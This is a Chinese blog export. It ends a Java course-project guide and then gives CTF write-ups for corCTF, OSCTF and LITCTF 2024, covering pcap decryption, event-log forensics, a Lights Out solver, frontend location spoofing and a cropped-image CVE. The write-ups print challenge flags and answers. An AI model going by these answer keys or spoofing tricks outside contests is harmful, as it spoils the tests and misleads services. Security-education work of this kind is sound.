&#123;<br>        ctx.status(<span class="hljs-number">400</span>);<br>        ctx.result(<span class="hljs-string">&quot;参数不全&quot;</span>);<br>        <span class="hljs-comment">//如果无法解析参数，则报错</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li>
<li>运行服务器，使用<code>postman</code>工具进行测试 (postman的安装和使用在此不做展开)</li>
</ol>
<img src="/2023/12/29/CS109-Project-HappyMatch/javalin_5.png" class="" title="javalin">

<h2 id="Socket-编程"><a href="#Socket-编程" class="headerlink" title="Socket 编程"></a>Socket 编程</h2><h3 id="什么是-Socket"><a href="#什么是-Socket" class="headerlink" title="什么是 Socket"></a>什么是 Socket</h3><blockquote>
<p>Socket（套接字）是计算机网络中用于实现网络通信的一种机制。它提供了一种编程接口，使得应用程序能够通过网络进行数据的发送和接收。</p>
<p>在网络通信中，Socket 是一种抽象概念，表示网络中的一个端点。一个 Socket 包含了一个 IP 地址和一个端口号，它用于标识网络中的一个特定的应用程序。</p>
<p>Socket 可以用于不同的网络通信协议，如 TCP（传输控制协议）和 UDP（用户数据报协议）。TCP 是一种面向连接的协议，提供可靠的、有序的、基于字节流的通信。UDP 是一种无连接的协议，提供不可靠的、无序的、基于数据报的通信。</p>
<p>在编程中，使用 Socket API 可以创建一个 Socket 对象，通过该对象进行网络通信。通过 Socket，应用程序可以建立连接、发送数据、接收数据和关闭连接。</p>
</blockquote>
<h3 id="什么情况用http服务端，什么时候用-Socket"><a href="#什么情况用http服务端，什么时候用-Socket" class="headerlink" title="什么情况用http服务端，什么时候用 Socket"></a>什么情况用http服务端，什么时候用 Socket</h3><p>当涉及到用户操作和服务器操作的隔离时，HTTP 服务器可以起到很好的作用。通过使用 HTTP 服务器，用户可以通过发送 HTTP 请求与服务器进行通信，而服务器可以根据请求来执行相应的操作。这种方式可以将用户操作与服务器操作分离开来，使得服务器可以独立处理请求并提供相应的响应。HTTP 服务器可以接收用户请求，执行相应的逻辑，然后返回结果给用户。</p>
<p>此外，HTTP 服务器还可以结合数据存储和游戏逻辑处理。HTTP 服务器可以与数据库或其他数据存储系统进行交互，以读取、写入和更新数据。例如，用户可以通过 HTTP 请求发送游戏数据到服务器，服务器将数据存储在数据库中，并在需要时进行游戏逻辑处理。HTTP 服务器可以提供接口来处理用户请求，并将数据存储和游戏逻辑处理委托给其他组件或服务。</p>
<p>另一方面，Socket 在局域网多人联机等场景中发挥重要作用。Socket 提供了一种实时的、双向的数据传输机制，适用于需要高实时性和低延迟的应用场景，如多人联机游戏。通过 Socket，多个玩家可以建立连接并在局域网中进行实时的游戏通信。Socket 允许玩家之间实时地发送和接收游戏数据，以保持游戏状态的同步和交互。</p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>挖个坑，日后补上，这里先引用几篇网上的教程：</p>
<p>基于 Java 简单实现 Socket 通信 <a href="https://zhuanlan.zhihu.com/p/441460332">https://zhuanlan.zhihu.com/p/441460332</a></p>
<p>Java 实现简单的 Socket 通信 <a href="https://www.cnblogs.com/robothy/p/14211690.html">https://www.cnblogs.com/robothy/p/14211690.html</a></p>
<h1 id="一些碎碎念"><a href="#一些碎碎念" class="headerlink" title="一些碎碎念"></a>一些碎碎念</h1><p>万事开头难，前期写铺垫代码的部分总是枯燥的。但一旦你打好了地基，你会发现，想要实现一个新功能时，可以凭借对于项目框架的熟悉，很快地打出你的组合拳（Ctrl C+V），这也是为什么我建议有能力的同学抛弃掉老师给的demo，自己实现一套框架。</p>
<p>非常感谢你能看到这里，希望这篇文章能帮你减轻一些写project的负担，预祝你在答辩中获得好成绩。o(<em>￣▽￣</em>)ブ</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>project</tag>
        <tag>cs109</tag>
      </tags>
  </entry>
  <entry>
    <title>corCTF_2024</title>
    <url>/2024/07/29/corCTF-2024/</url>
    <content><![CDATA[<span class="label label-success">Team: H4aG4au, Ranked: 40, Pts: 1002</span>

<h2 id="forensics"><a href="#forensics" class="headerlink" title="forensics"></a>forensics</h2><h3 id="the-conspiracy"><a href="#the-conspiracy" class="headerlink" title="the-conspiracy"></a>the-conspiracy</h3><h4 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h4><span class="label label-success">Author: jammy, Solved: 283, Pts: 109</span>
<div class="note note-info">
            <p>Our intelligence team created a chat app, and secretly distributed it to the lemonthinker gang. We’ve given you the application source and a capture taken by one of our agents - can you uncover their plans?</p><ul><li><a href="/2024/07/29/corCTF-2024/Forensics%5Cthe-conspiracy%5Csource.py" title="source.py">source.py</a></li><li><a href="/2024/07/29/corCTF-2024/Forensics%5Cthe-conspiracy%5Cchallenge.pcap" title="challenge.pcap">challenge.pcap</a></li></ul>
          </div>
<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><p>按照<code>source.py</code>中的<code>encrypt</code>方法写出对应的<code>decrypt</code>方法</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">finalmessage, keys</span>):<br>    messagenums = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(finalmessage)):<br>        messagenums.append(finalmessage[i] / keys[i])<br><br>    message = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(messagenums)):<br>        message += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(messagenums[i]))<br><br>    <span class="hljs-keyword">return</span> message<br></code></pre></td></tr></table></figure>
<p>遍历数据包解密。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">packets = rdpcap(<span class="hljs-string">&quot;challenge.pcap&quot;</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>, <span class="hljs-built_in">len</span>(packets) - <span class="hljs-number">1</span>, <span class="hljs-number">2</span>):<br>    message = <span class="hljs-built_in">str</span>(packets[i].load).replace(<span class="hljs-string">&quot;b&#x27;[&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;]&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).split(<span class="hljs-string">&quot;, &quot;</span>)<br>    keys = <span class="hljs-built_in">str</span>(packets[i + <span class="hljs-number">1</span>].load).replace(<span class="hljs-string">&quot;b&#x27;[&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;]&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).split(<span class="hljs-string">&quot;, &quot;</span>)<br>    <span class="hljs-built_in">print</span>(decrypt(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, message)), <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, keys))))<br></code></pre></td></tr></table></figure>


    <div class="fold">
      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-6ae3e036" role="button" aria-expanded="false" aria-controls="collapse-6ae3e036">
        <div class="fold-arrow">▶</div>solve.py
      </div>
      <div class="fold-collapse collapse" id="collapse-6ae3e036">
        <div class="fold-content">
          <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> scapy.<span class="hljs-built_in">all</span> <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">finalmessage, keys</span>):<br>    messagenums = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(finalmessage)):<br>        messagenums.append(finalmessage[i] / keys[i])<br>    message = <span class="hljs-string">&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(messagenums)):<br>        message += <span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(messagenums[i]))<br>    <span class="hljs-keyword">return</span> message<br>packets = rdpcap(<span class="hljs-string">&quot;challenge.pcap&quot;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">6</span>, <span class="hljs-built_in">len</span>(packets) - <span class="hljs-number">1</span>, <span class="hljs-number">2</span>):<br>    message = <span class="hljs-built_in">str</span>(packets[i].load).replace(<span class="hljs-string">&quot;b&#x27;[&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;]&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).split(<span class="hljs-string">&quot;, &quot;</span>)<br>    keys = <span class="hljs-built_in">str</span>(packets[i + <span class="hljs-number">1</span>].load).replace(<span class="hljs-string">&quot;b&#x27;[&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;]&#x27;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).split(<span class="hljs-string">&quot;, &quot;</span>)<br>    <span class="hljs-built_in">print</span>(decrypt(<span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, message)), <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>, keys))))<br></code></pre></td></tr></table></figure>
        </div>
      </div>
    </div>

    <div class="fold">
      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-b55cf779" role="button" aria-expanded="false" aria-controls="collapse-b55cf779">
        <div class="fold-arrow">▶</div>output
      </div>
      <div class="fold-collapse collapse" id="collapse-b55cf779">
        <div class="fold-content">
          <p>hello blinkoid<br>hello night<br>how do we eliminate the msfroggers<br>idk i’ll ask slice1<br>how do we eliminate the msfroggers<br>we can send them to the skibidi toilet<br>or we can deprive them of their fanum tax<br>slice1 is being useless<br>what’s new<br>blinkoid? message back :(<br>oh errr… this sounds great! any more ideas<br>we could co-conspire with the afs<br>and get them to infiltrate the msfroggers<br>that way team lemonthink reins supreme<br>your a genius!<br>alright night<br>i have my own idea<br>let’s hear it<br>so yk about the afs<br>if we send our secret code over to them<br>they can use it to infiltrate the afs<br>what’s our code again?<br>i think it’s <code>corctf{b@53d_af_f0r_th3_w1n}</code><br>hey night did you hear my idea<br>you had an idea? blinkoid just told me you were being useless<br>what the sigma</p>
        </div>
      </div>
    </div>
<h3 id="infiltration"><a href="#infiltration" class="headerlink" title="infiltration"></a>infiltration</h3><h4 id="题面-1"><a href="#题面-1" class="headerlink" title="题面"></a>题面</h4><span class="label label-success">Author: jammy, Solved: 164, Pts: 116</span>
<div class="note note-info">
            <p>After successfully infiltrating the lemonthinker gang, we’ve obtained their current location - the UK. We’ve attained some security logs from a gang member’s PC, but need some help in answering information relating to these.<br><code>nc be.ax 32222</code></p><ul><li><a href="/2024/07/29/corCTF-2024/Forensics%5Cinfiltration%5Csecurity-logs.evtx" title="security-logs.evtx">security-logs.evtx</a></li></ul>
          </div>
<h4 id="题解-1"><a href="#题解-1" class="headerlink" title="题解"></a>题解</h4><p>根据交互信息提示，找到对应的字段：</p>

    <div class="fold">
      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-f253fd99" role="button" aria-expanded="false" aria-controls="collapse-f253fd99">
        <div class="fold-arrow">▶</div>shell
      </div>
      <div class="fold-collapse collapse" id="collapse-f253fd99">
        <div class="fold-content">
          <p>Hello agent. Thanks for your hard work in the field researching. We’ll now ask you <code>6 questions</code> on the information you’ve gathered.<br>I’d like to take this opportunity to remind you that our targets are located in the United Kingdom, so their timezone is BST (UTC +1).<br>We’d like to confirm what the username of the <code>main user</code> on the target’s computer is. Can you provide this information? slice1<br>Now, we’d like the <code>name of the computer</code>, after it was renamed. Ensure that it is entered in exactly how it is in the logs.<br>I wonder if they’ll make any lemonade with that lemon-squeezer…<br>Great work! In order to prevent their lemons from moulding, the lemonthinkers changed the <code>maximum password age</code>. What is this value? Please enter it as an integer number in days.<br>It seems that our targets are incredibly smart, and <code>turned off the antivirus</code>. At what <code>time</code> did this happen? Give your answer as a UNIX timestamp.<br>The main lemonthinker, slice1, hasn’t learnt from the-conspiracy and has (again) downloaded some malware on the system. What is the <code>name of the user created by this malware</code>?<br>Finally, we’d like to know the <code>name of the privilege level of the user created by the malware</code>. What is this?</p>
        </div>
      </div>
    </div>
<ol>
<li>主机用户名：查看登录事件，尝试得<code>slice1</code>。</li>
<li>变更后主机名：事件中包含多台计算机名，尝试后得<code>lemon-squeezer</code>。</li>
<li>更改最大密码时限：筛选<code>事件4739</code>，找到时间为<code>83</code>天。</li>
<li>关闭Windows defender：搜索defender，筛选<code>事件4699</code>，从<code>已删除计划任务</code>事件得到具体时间。</li>
<li>创建新用户：筛选<code>事件4720</code>，得到病毒创建的用户为<code>notabackdoor</code>。</li>
<li>创建新特权等级：<code>事件4732</code>，得到病毒创建的特权等级为<code>Administrators</code>。</li>
</ol>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="lights-out"><a href="#lights-out" class="headerlink" title="lights-out"></a>lights-out</h3><h4 id="题面-2"><a href="#题面-2" class="headerlink" title="题面"></a>题面</h4><span class="label label-success">Author: plastic, Solved: 155, Pts: 117</span>
<div class="note note-info">
            <p>You know the game. Solve the board quickly before a new one is generated.</p><ul><li><a href="/2024/07/29/corCTF-2024/Misc%5Cligts_out%5Clights_out.py" title="lights_out.py">lights_out.py</a></li></ul>
          </div>
<h4 id="题解-2"><a href="#题解-2" class="headerlink" title="题解"></a>题解</h4><p>源码中已经给出了<code>线性代数解</code>的代码，直接调用即可。</p>

    <div class="fold">
      <div class="fold-title fold-default collapsed" data-toggle="collapse" href="#collapse-9c51fa20" role="button" aria-expanded="false" aria-controls="collapse-9c51fa20">
        <div class="fold-arrow">▶</div>solve.py
      </div>
      <div class="fold-collapse collapse" id="collapse-9c51fa20">
        <div class="fold-content">
          <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_vector_representations</span>(<span class="hljs-params">n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]]:<br>    vectors = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n * n):<br>        vector = [<span class="hljs-number">0</span>] * (n * n)<br>        vector[i] = <span class="hljs-number">1</span><br>        <span class="hljs-keyword">if</span> i % n != <span class="hljs-number">0</span>:<br>            vector[i - <span class="hljs-number">1</span>] = <span class="hljs-number">1</span>  <span class="hljs-comment"># 左</span><br>        <span class="hljs-keyword">if</span> i % n != n - <span class="hljs-number">1</span>:<br>            vector[i + <span class="hljs-number">1</span>] = <span class="hljs-number">1</span>  <span class="hljs-comment"># 右</span><br>        <span class="hljs-keyword">if</span> i &gt;= n:<br>            vector[i - n] = <span class="hljs-number">1</span>  <span class="hljs-comment"># 上</span><br>        <span class="hljs-keyword">if</span> i &lt; n * (n - <span class="hljs-number">1</span>):<br>            vector[i + n] = <span class="hljs-number">1</span>  <span class="hljs-comment"># 下</span><br>        vectors.append(vector)<br>    <span class="hljs-keyword">return</span> vectors<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">gauss_jordan_elimination</span>(<span class="hljs-params">matrix: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]]</span>) -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]]:<br>    rows, cols = <span class="hljs-built_in">len</span>(matrix), <span class="hljs-built_in">len</span>(matrix[<span class="hljs-number">0</span>])<br>    r = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(cols - <span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> r &gt;= rows:<br>            <span class="hljs-keyword">break</span><br>        pivot = <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(r, rows):<br>            <span class="hljs-keyword">if</span> matrix[i][c] == <span class="hljs-number">1</span>:<br>                pivot = i<br>                <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">if</span> pivot <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>            <span class="hljs-keyword">continue</span><br>        <span class="hljs-keyword">if</span> r != pivot:<br>            matrix[r], matrix[pivot] = matrix[pivot], matrix[r]<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(rows):<br>            <span class="hljs-keyword">if</span> i != r <span class="hljs-keyword">and</span> matrix[i][c] == <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(cols):<br>                    matrix[i][j] ^= matrix[r][j]<br>        r += <span class="hljs-number">1</span><br>    <span class="hljs-keyword">return</span> matrix<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create_augmented_matrix</span>(<span class="hljs-params"></span><br><span class="hljs-params">    vectors: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]], board: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]</span><br><span class="hljs-params"></span>) -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]]:<br>    matrix = [vec + [board[i]] <span class="hljs-keyword">for</span> i, vec <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(vectors)]<br>    <span class="hljs-keyword">return</span> matrix<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_solvable</span>(<span class="hljs-params">matrix: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>]]</span>) -&gt; <span class="hljs-built_in">bool</span>:<br>    rref = gauss_jordan_elimination(matrix)<br>    <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> rref:<br>        <span class="hljs-keyword">if</span> row[-<span class="hljs-number">1</span>] == <span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">all</span>(val == <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> val <span class="hljs-keyword">in</span> row[:-<span class="hljs-number">1</span>]):<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_solution</span>(<span class="hljs-params">board: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>], n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] | <span class="hljs-literal">None</span>:<br>    vectors = create_vector_representations(n)<br>    matrix = create_augmented_matrix(vectors, board)<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_solvable(matrix):<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br>    rref_matrix = gauss_jordan_elimination(matrix)<br>    <span class="hljs-keyword">return</span> [row[-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> rref_matrix[: n * n]]<br><br><br><span class="hljs-comment"># 导入netcat</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> remote<br><br><span class="hljs-comment"># 连接到远程服务器</span><br><span class="hljs-comment"># nc be.ax 32421</span><br>r = remote(<span class="hljs-string">&quot;be.ax&quot;</span>, <span class="hljs-number">32421</span>)<br><span class="hljs-comment"># 等待，直至出现&quot;Your Solution:&quot;提示</span><br>r.recvuntil(<span class="hljs-string">&quot;Lights Out Board:&quot;</span>.encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br><span class="hljs-comment"># 读取输出</span><br>data = r.recv().decode()<br>data = (<br>    data.replace(<span class="hljs-string">&quot;\n\n\n\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;\n\n\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).replace(<span class="hljs-string">&quot;Your Solution: \n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br>)<br><span class="hljs-built_in">print</span>(data)<br><span class="hljs-comment"># 计算</span><br>n = <span class="hljs-built_in">len</span>(data.split(<span class="hljs-string">&quot;\n&quot;</span>)[<span class="hljs-number">0</span>])<br>board = [<span class="hljs-number">1</span> <span class="hljs-keyword">if</span> c == <span class="hljs-string">&quot;#&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> data.replace(<span class="hljs-string">&quot;\n&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)]<br>solution = <span class="hljs-string">&quot;&quot;</span>.join(<span class="hljs-string">&quot;#&quot;</span> <span class="hljs-keyword">if</span> x == <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;.&quot;</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> get_solution(board, n))<br><span class="hljs-comment"># 发送解决方案</span><br>r.send((solution + <span class="hljs-string">&quot;\n&quot;</span>).encode(<span class="hljs-string">&quot;ascii&quot;</span>))<br><span class="hljs-built_in">print</span>(solution)<br><span class="hljs-comment"># 输出结果</span><br><span class="hljs-keyword">try</span>:<br>    <span class="hljs-built_in">print</span>(r.recv().decode())<br><span class="hljs-keyword">except</span> EOFError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Error: Failed to receive data from the remote server.&quot;</span>)<br><span class="hljs-comment"># 关闭连接</span><br>r.close()<br></code></pre></td></tr></table></figure>
        </div>
      </div>
    </div>

<h3 id="touch-grass-2"><a href="#touch-grass-2" class="headerlink" title="touch grass 2"></a>touch grass 2</h3><span class="label label-success">Author: strellic, BrownieInMotion, FizzBuzz101, Solved: 60, Pts: 151</span>

<h4 id="题解-3"><a href="#题解-3" class="headerlink" title="题解"></a>题解</h4><p>一道鼓励你亲近大自然的题，前端伪造定位即可。</p>
<img src="/2024/07/29/corCTF-2024/Misc/touchgrass2/1.png" class="">
<img src="/2024/07/29/corCTF-2024/Misc/touchgrass2/2.png" class="">]]></content>
      <categories>
        <category>ctfwp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
        <tag>CORCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>OSCTF_2024</title>
    <url>/2024/07/25/OSCTF-2024/</url>
    <content><![CDATA[<h1 id="OSCTF-2024"><a href="#OSCTF-2024" class="headerlink" title="OSCTF_2024"></a>OSCTF_2024</h1><blockquote>
<p>Rank23，被<a href="https://ctftime.org/team/307181">H4aG4au</a>的大佬们带飞~<br>下面是我解出的misc的题解。</p>
</blockquote>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><blockquote>
<p>有好多minecraft题，好耶( •̀ ω •́ )y</p>
</blockquote>
<h3 id="Finding-the-Seed"><a href="#Finding-the-Seed" class="headerlink" title="Finding the Seed"></a>Finding the Seed</h3><p>按照题目和视频指示，加入<code>1.20.1</code>的minecraft服务器<code>play.capitalrealm.tech</code>（科学<br>使用<code>https://github.com/19MisterX98/SeedcrackerX</code>，跑跑图收集一下地图结构，即可通过模组反算出种子。</p>
<img src="/2024/07/25/OSCTF-2024/seed.PNG" class="">
<p><code>flag&#123;seed&#125;</code></p>
<h3 id="Cryptic-Pigeon"><a href="#Cryptic-Pigeon" class="headerlink" title="Cryptic Pigeon"></a>Cryptic Pigeon</h3><p>鸽子加密<br>Encrypted : “ᒷ1ᒣ☐0⟓ᒣ0⊔🝕🝕🝕🝕”<br>用Pigpen Cipher <a href="https://www.boxentriq.com/code-breaking/pigpen-cipher">https://www.boxentriq.com/code-breaking/pigpen-cipher</a><br>Grid,X,Grid,X 模式解密得 “P1GE0NG0BRRRR”</p>
<h3 id="The-Hidden-Soundwave"><a href="#The-Hidden-Soundwave" class="headerlink" title="The Hidden Soundwave"></a>The Hidden Soundwave</h3><p>做题还有电音听~<br>频谱图末尾</p>
<img src="/2024/07/25/OSCTF-2024/soudwave.PNG" class="">

<h3 id="Forensics-Seele-Vellorei"><a href="#Forensics-Seele-Vellorei" class="headerlink" title="Forensics-Seele Vellorei"></a>Forensics-Seele Vellorei</h3><p>常见的doc文档隐写考点，移走文档中的图片，再统一一下文字的格式就可以看到隐形的flag了。</p>
<h3 id="Hidden-Message"><a href="#Hidden-Message" class="headerlink" title="Hidden Message"></a>Hidden Message</h3><p>好耶又是minecraft<br>下载地图，进入游戏，发现在进游戏的一瞬间有挺多奇怪的事情，药水效果、不正常的氧气值……<br>这些数据都由<code>.\playerdata\</code>下的<code>nbt</code>文件控制。<br>用<code>nbtStudio</code>打开，按照字母顺序排序，再用ASCII表解码即可得到flag。</p>
<img src="/2024/07/25/OSCTF-2024/save1.PNG" class="">
<img src="/2024/07/25/OSCTF-2024/save2.PNG" class="">


<h3 id="Code-Breaker"><a href="#Code-Breaker" class="headerlink" title="Code Breaker"></a>Code Breaker</h3><p><del>好耶又是好耶又是minecraft</del><br>去到指定地点，发现是红石解密。</p>
<img src="/2024/07/25/OSCTF-2024/cb.png" class="">
<p>电路被封起来了，上<code>Xray</code>！</p>
<img src="/2024/07/25/OSCTF-2024/cb2.png" class="">
<img src="/2024/07/25/OSCTF-2024/cb1.png" class="">
<p>上下两层分别是两个<code>与门</code>。</p>
<img src="/2024/07/25/OSCTF-2024/cb3.png" class="">


<h3 id="Captured-Data"><a href="#Captured-Data" class="headerlink" title="Captured Data"></a>Captured Data</h3><p>给了一个excel表格，里面竖向规律地排列着两种类型的数据，转换为二进制即可解出flag。</p>



<h2 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h2><h3 id="Mysterious-Website-Incident"><a href="#Mysterious-Website-Incident" class="headerlink" title="Mysterious Website Incident"></a>Mysterious Website Incident</h3><p>给了一个nginx日志，寻找到一个可疑的谷歌云端硬盘链接，访问链接，就得到了flag。</p>
<h3 id="Phantom-Script-Intrusion"><a href="#Phantom-Script-Intrusion" class="headerlink" title="Phantom Script Intrusion"></a>Phantom Script Intrusion</h3><p>给了一个混淆后的的PHP脚本，在去混淆后，注意到<code>$&#123;&quot;GLOBALS&quot;&#125;</code>有一个短网址链接。访问链接，就得到了flag。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>题目难度适中，总体上来说没学到什么东西，下次比赛会尝试走出misc舒适圈，挑战一下其他领域的题目。</p>
]]></content>
      <categories>
        <category>ctfwp</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>wp</tag>
        <tag>OSCTF</tag>
      </tags>
  </entry>
  <entry>
    <title>LITCTF-2024</title>
    <url>/2024/08/12/LITCTF-2024/</url>
    <content><![CDATA[<h1 id="LITCTF-2024"><a href="#LITCTF-2024" class="headerlink" title="LITCTF - 2024"></a>LITCTF - 2024</h1><p>应<a href="https://chanbengz.github.io/">学长</a>的邀请，参加了<a href="https://lit.lhsmathcs.org/">LITCTF</a>🥰🥰<br>整体感觉还不错，难度中等，题目有趣。😘😘<br><del>除了中途主办方设置的flag不对导致迷惑了好久之外没什么大问题</del><br>下面是我解出的题以及对应的题解。</p>
<h2 id="Misc-杂项"><a href="#Misc-杂项" class="headerlink" title="Misc - 杂项"></a>Misc - 杂项</h2><p>难度疑似有点两极分化了😢</p>
<h3 id="welcome"><a href="#welcome" class="headerlink" title="welcome"></a>welcome</h3><p>签到题，进discord获取前半部分flag，看比赛规则获取后半部分flag。</p>
<h3 id="geoguessr1"><a href="#geoguessr1" class="headerlink" title="geoguessr1"></a>geoguessr1</h3><blockquote>
<p>Where is this? Flag format: Use three decimal points of precision and round. The last digit of the first coordinate is ODD, and the last digit of the second coordinate is EVEN. Example: LITCTF{80.439,-23.498} (no spaces)</p>
</blockquote>
<img src="/2024/08/12/LITCTF-2024/IMG_6375.jpg" class="">
<p>图寻题，请出AI🤖：<a href="https://geospy.web.app/">https://geospy.web.app/</a><br>轻松找到目的地😁</p>
<img src="/2024/08/12/LITCTF-2024/geospy.png" class="">
<p><code>LITCTF&#123;24.885,121.284&#125;</code></p>
<h3 id="geoguessr2"><a href="#geoguessr2" class="headerlink" title="geoguessr2"></a>geoguessr2</h3><blockquote>
<p>Our history class recently took a walk on a field trip here. Where is this? Flag format: Use three decimal points of precision and round. The last digit of the first coordinate is EVEN, and the last digit of the second coordinate is ODD. Example:</p>
</blockquote>
<img src="/2024/08/12/LITCTF-2024/IMG_7952.jpg" class="">
<p>还是用<code>geospy</code>：</p>
<img src="/2024/08/12/LITCTF-2024/geospy1.png" class="">
<img src="/2024/08/12/LITCTF-2024/geo1.png" class="">
<p><code>LITCTF&#123;42.450,-71.233&#125;</code></p>
<h3 id="a-little-bit-of-tomcroppery"><a href="#a-little-bit-of-tomcroppery" class="headerlink" title="a little bit of tomcroppery"></a>a little bit of tomcroppery</h3><blockquote>
<p>Once you crop an image, the cropped part is gone… right???</p>
</blockquote>
<img src="/2024/08/12/LITCTF-2024/image.png" class="">

<p>题目提示我们，截图过后被截掉的部分应该消失。但是部分设备存在漏洞<code>CVE-2023-21036</code>，使得被截掉的部分没有被正常抹除，我们从而可以借助某些工具🔧修复未被抹除的部分。</p>
<ul>
